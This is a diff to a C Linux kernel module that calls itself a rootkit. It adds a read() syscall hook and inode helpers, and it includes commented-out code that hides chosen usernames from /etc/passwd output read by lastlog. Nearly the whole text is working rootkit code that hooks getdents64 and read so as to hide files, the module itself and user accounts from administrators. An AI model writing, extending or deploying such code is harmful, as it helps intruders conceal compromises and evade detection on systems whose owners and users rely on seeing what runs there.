@@ -5,6 +5,7 @@
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <linux/namei.h>
+#include <linux/rcupdate.h>
 
 #define LICENCE "GPL"
 #define DESCRIPTION "Rootkit that can hide arbitrary ressources by using the configure command line tool."
@@ -20,13 +21,39 @@ MODULE_DESCRIPTION(DESCRIPTION);
 MODULE_AUTHOR(AUTHOR);
 MODULE_VERSION(VERSION);
 
+/***********************************************************
+*          HELPER FUNCTIONS                                *
+***********************************************************/
+
+static unsigned long file_to_inode(const char * file) {
+
+    struct path path;
+    path.dentry = NULL;
+
+    kern_path(file,LOOKUP_FOLLOW, &path);
+    
+    if(path.dentry == NULL) {
+        return 0;
+    }
+    
+    return path.dentry->d_inode->i_ino;
+
+}
+
+
+
+
+
+/***********************************************************
+*          LINKED INODE LIST                               *
+***********************************************************/
 
 typedef struct node {
     long unsigned int inode;
     struct node * next;
 } node_t;
 
-node_t * head = NULL;
+static node_t * head = NULL;
 
 static int inode_in_list(long unsigned int inode) {
     node_t * node = head;
@@ -106,7 +133,6 @@ static void clear_inodes(void) {
 
 
 
-
 /***********************************************************
 *          HOOK SYSTEM CALLS                               *
 ***********************************************************/
@@ -175,6 +201,109 @@ static int unhook(unsigned int syscall_number) {
 
 
 
+/***********************************************************
+*          LINKED USERNAME LIST                            *
+***********************************************************/
+
+/*static unsigned long _inode_etc_passwd = 0;
+
+typedef struct user_node {
+    char * username;
+    struct user_node * next;
+} user_node_t;
+
+static user_node_t * user_head = NULL;
+
+static int user_in_list(const char * username) {
+    user_node_t * node = user_head;
+    
+    while(node != NULL) {
+        if (strncmp(username, node->username,strlen(node->username)) == 0) {
+            return 1;
+        }
+        node = node->next;
+    }
+    return 0;
+}
+
+static int insert_user(const char * username) {
+
+    user_node_t * node;
+    user_node_t * n;
+
+    if (user_in_list(username)) {
+        return 0;
+    }
+
+    node = (user_node_t *) kzalloc(sizeof(user_node_t), GFP_KERNEL);
+    if (node == NULL) {
+        return -1;
+    }
+
+    node->username = kzalloc(strlen(username) + 1, GFP_KERNEL);
+    if (node->username == NULL) {
+        kfree(node);
+        return -1;
+    }
+
+    memmove(node->username, username, strlen(username)+1);
+
+    if (user_head == NULL) {
+        user_head = node;
+        return 0;
+    }
+
+    n = user_head;
+    while(n->next != NULL) {
+        n = n->next;
+    }
+
+    n->next = node;
+
+    return 0;
+}
+
+static int remove_user(const char * username) {
+    user_node_t * node = user_head;
+    user_node_t * last = NULL;
+
+    if (strcmp(user_head->username, username) == 0) {
+        user_head = user_head->next;
+        kfree(node->username);
+        kfree(node);
+        return 0;
+    }
+
+    while (node->next != NULL && strcmp(node->username, username) == 0) {
+        node = node->next;
+    }
+
+    if (node->next == NULL) return -1;
+
+    last = node;
+    node = last->next;
+    last->next = node->next;
+    kfree(node->username);
+    kfree(node);
+
+    return 0;
+
+}
+
+static void clear_users(void) {
+    user_node_t * my_head = user_head;
+    user_node_t * node;
+    while(my_head != NULL) {
+        printk(KERN_ALERT "Rootkit: hangs in a loop now\n");
+        node = user_head;
+        my_head = my_head->next;
+        kfree(node->username);
+        kfree(node);
+    }
+}*/
+
+
+
 
 /***********************************************************
 *          NEW SYSTEM CALLS                                *
@@ -197,7 +326,7 @@ int my_getdents64(const struct pt_regs * regs) {
     dirent = (struct linux_dirent64 *)regs->si;
 
     my_dirent = kzalloc(length, GFP_KERNEL);
-    if (dirent == NULL) {
+    if (my_dirent == NULL) {
         printk(KERN_ALERT "Rootkit: unable to allocate buffer in %s\n", __FUNCTION__);
         return length;
     }
@@ -231,6 +360,47 @@ int my_getdents64(const struct pt_regs * regs) {
     return length;
 }
 
+int my_read(const struct pt_regs * regs) {
+    int length;
+    int fd = regs->di;
+    struct file * file;
+    char __user * buff;
+    int i, j;
+
+    length =original[__NR_read](regs);
+
+    /*if (strncmp(current->comm, "lastlog", 7) != 0) {
+        return length;
+    }
+
+    file = files_lookup_fd_rcu(current->files, fd);
+    
+    if (file && file->f_inode->i_ino == _inode_etc_passwd) {
+        buff = (char *)regs->si;
+        
+        if(user_access_begin(buff, length)) {
+            
+            for(i = 0; i < length; i++) {
+                if (user_in_list(buff+i)) {
+                    j = 0;
+                    
+                    while(i+j < length && buff[i+j] != '\n') {
+                        j++;
+                    }
+                    
+                    memmove(buff+i, buff+i+j, length-i-j);
+                    length -= j;
+                }
+            }
+
+            user_access_end();
+        }
+    
+    }*/
+
+    return length;
+}
+
 
 
 
@@ -253,32 +423,52 @@ static void showmodule(void) {
 }
 
 static char * hidefile(const char * file) {
-    struct path path;
-    path.dentry = NULL;
-    kern_path(file,LOOKUP_FOLLOW, &path);
-    if(path.dentry == NULL) {
+
+    unsigned long inode;
+
+    inode = file_to_inode(file);
+    
+    if (inode == 0) {
         return "no such file or directory.";
     }
     
-    if(insert_inode(path.dentry->d_inode->i_ino) == -1) {
+    if(insert_inode(inode) == -1) {
         return "could not hide file";
     }
     return "hiding requested file!";
 }
 
 static char * showfile(const char * file) {
-    struct path path;
-    path.dentry = NULL;
-    kern_path(file,LOOKUP_FOLLOW, &path);
-    if(path.dentry == NULL) {
+
+    unsigned long inode;
+
+    inode = file_to_inode(file);
+    
+    if (inode == 0) {
         return "no such file or directory.";
     }
     
-    if(remove_inode(path.dentry->d_inode->i_ino) == -1) {
-        return "file not hidden.";
+    if(remove_inode(inode) == -1) {
+        return "file not hidden";
     }
     return "unhide requested file!";
 }
+
+/*static char * hideuser(const char * username) {
+
+    if(insert_user(username) == -1) {
+        return "could not hide user";
+    }
+    return "hiding requested user!";
+}
+
+static char * showuser(const char * username) {
+    
+    if(remove_user(username) == -1) {
+        return "user not hidden.";
+    }
+    return "unhide requested user!";
+}*/
 
 static char * configure(char * command) {
     if (strcmp(command, "hidemodule") == 0) {
@@ -303,6 +493,12 @@ static char * configure(char * command) {
         strncpy(command+2,"/proc/",6);
         return showfile(command+2);
     }
+    /*if (strncmp(command, "hideuser ", 8) == 0) {
+        return hideuser(command+9);
+    }
+    if (strncmp(command, "showuser ", 8) == 0) {
+        return showuser(command+9);
+    }*/
     printk(KERN_INFO "Rootkit: unknown command %s\n", command);
     return "Error: unknowm command";
 }
@@ -402,9 +598,14 @@ module_load(void) {
     // will crash.
 
     if(hook(__NR_getdents64, my_getdents64) != 0) {
-        printk(KERN_ERR "Rootkit:");
+        printk(KERN_ERR "Rootkit: could nod hook getdents64\n");
     }
 
+    //_inode_etc_passwd = file_to_inode("/etc/passwd");
+
+    if(hook(__NR_read, my_read) != 0) {
+        printk(KERN_ERR "Rootkit: could not hook read'n");
+    }
     
 
     return 0;
@@ -414,10 +615,16 @@ static void __exit
 module_unload(void) {
 
     if(unhook(__NR_getdents64) != 0) {
-        printk(KERN_ERR "Rootkit:");
+        printk(KERN_ERR "Rootkit: could not unhook getdents64\n");
+    }
+
+    if(unhook(__NR_read) != 0) {
+        printk(KERN_ERR "Rootkit: could not unhook read\n");
     }
 
     clear_inodes();
+
+    //clear_users();
 
     close_socket();
 
